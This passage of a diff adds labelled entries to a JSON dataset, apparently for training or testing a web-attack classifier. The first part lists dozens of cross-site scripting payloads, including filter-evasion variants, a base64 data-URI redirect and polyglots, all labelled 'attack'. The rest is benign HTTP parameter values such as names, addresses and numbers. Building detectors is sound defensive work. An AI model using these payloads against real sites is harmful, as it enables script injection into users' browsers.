+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img onload=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x onerror=prompt(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<a href=\"javascript:alert(1)\" onmouseover=alert(1)>INJECTX HOVER</a>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "onmouseover=\"document.cookie=true;\">//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<h1>INJECTX</h1>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg><script>/<@/>alert(1)</script>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert(/INJECTX/)>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<iframe/onload=alert(/INJECTX/)>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert`INJECTX`>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert(`INJECTX`)>",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "}alert(/INJECTX/);{//",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<h1/onclick=alert(1)>a//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<p/onclick=alert(/INJECTX/)>a",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video><source onerror=\"javascript:alert(1)\">//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video onerror=\"javascript:alert(1)\"><source>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<audio onerror=\"javascript:alert(1)\"><source>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<input autofocus onfocus=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<select autofocus onfocus=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<textarea autofocus onfocus=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<keygen autofocus onfocus=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<button form=test onformchange=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<form><button formaction=\"javascript:alert(1)\">//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg onload=(alert)(1) >//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>$=1,alert($)</script>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<!--<img src=\"--><img src=x onerror=alert(1)//\">//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img/src='x'onerror=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<marguee/onstart=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(1)//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert(1)<!--INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX",
+    "label": "attack",
+    "category": "pat-xss_payloads_quick",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>alert('XSS')</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><script>alert('XSS')</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x onerror=alert('XSS');>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><img src=x onerror=alert('XSS');>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg\fonload=alert(1)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert('XSS')>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<svg id=alert(1) onload=eval(id)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\"><svg/onload=alert(/XSS/)",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<body onload=alert(/XSS/.source)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<input autofocus onfocus=alert(1)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<select autofocus onfocus=alert(1)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<textarea autofocus onfocus=alert(1)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video/poster/onerror=alert(1)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video><source onerror=\"javascript:alert(1)\">",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<video src=_ onloadstart=\"alert(1)\">",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<details/open/ontoggle=\"alert`1`\">",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<meta/content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "data:text/html,<script>alert(0)</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\">><marquee><img src=x onerror=confirm(1)></marquee>\" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm&lpar; 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"http: //i.imgur.com/P8mL8.jpg\">",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "\" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object onafterscriptexecute=confirm(0)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<object onbeforescriptexecute=confirm(0)>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>window['alert'](document['domain'])<script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<img src='1' onerror/=alert(0) />",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>window['alert'](0)</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>parent['alert'](1)</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>self['alert'](2)</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<script>top['alert'](3)</script>",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "<x oncut=alert(1)>cut this!",
+    "label": "attack",
+    "category": "pat-IntrudersXSS",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "40184",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "nuda drudes",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ del ferrocarril, 152,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2070765320009143",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1902",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ulldemol bujeque",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "plaa caudillo 60",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "maala8",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "peuela sains",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ 57 15, 9g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "empeltre",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "estantalar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "21924971z",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25260",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "h9655",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "dunlap-leaud@videospornocaseros.ye",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pobla de montorns, la",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "kong-que",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "goggin",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "plebs cadevall",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cueva de montesinos 80 11-g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "xiangsen",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "01633578a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5562206225092204",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "4377",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "molledo basagaa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "carretera de las ermitas 188",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "lauriaul",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "nype.shafer@canovash.bv",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "merindad de ro ubierna",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "robieux",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "darby",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "thalasso.chappell@titulosoficiales.jp",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "0350022340129740",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "julisa",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "03266253t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "0992218178104844",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "5788",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "graziana",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "16648",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "07u8e37ia",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "07901950r",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39638",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "portal",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "marino",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "c/ garcia morente 129",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2533839429419532",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "natn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "68201502q",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "36680",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "*r6t58a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "r8cid0va",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "14977979b",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45183",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "d2s7sp79ro",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "spiegel-haake@convention.no",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "turcia",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "r92e1*56e",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pu6ue97",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "72367579b",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1721278325772936",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "starr-fjelmose@cdgranadabaila.travel",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "47815",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "2354",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "raian",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "78977050h",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "24224",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "58772485x",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39515",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "zanquita",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "14ab214c6n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "quartet@cabare.com.cs",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "espluga de francol l'",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "acre",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "52137467d",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "31282",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "62si27t8ico",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "encrasar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "86943454g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "lubna",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pealver palenzuela",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "zabalza",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "erickson",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "procacci",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "conde",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25330",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "mialgi5",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pablo iglesias s/n 2?f",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "technoso",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "briseboi",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "39699852n",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "37115",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "comisorio",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pesche@campodegolf.com.sy",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "valseca",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "419747iv6",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "orientalista",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sala@mystyleperfume.ls",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "7771884953425478",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "telema",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "25109956m",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45370",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "arrego76arse",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1i6p06ej7",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "54709157t",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "1571256483586961",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sibonet",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "estrada mendiarte s/n, 10?a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "sa89gn",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cojera",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "calle madagascar 130",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ineluctable",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "pozzetto@miplat.am",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cervera de la caada",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "havis",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "cooksey",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "gomero gallardo",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "paratge ter, 33,",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vial",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "37905890g",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "40529",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "encalador",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "ten.tar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "vitola@23horas.ad",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "45810",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "desconsolar",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "infante juan manuel s/n 5?a",
+    "label": "benign",
+    "category": "httpparams-norm",
+    "source": "HttpParamsDataset"
+  },
+  {
+    "text": "9738066615220073",
+    "label": "benign",
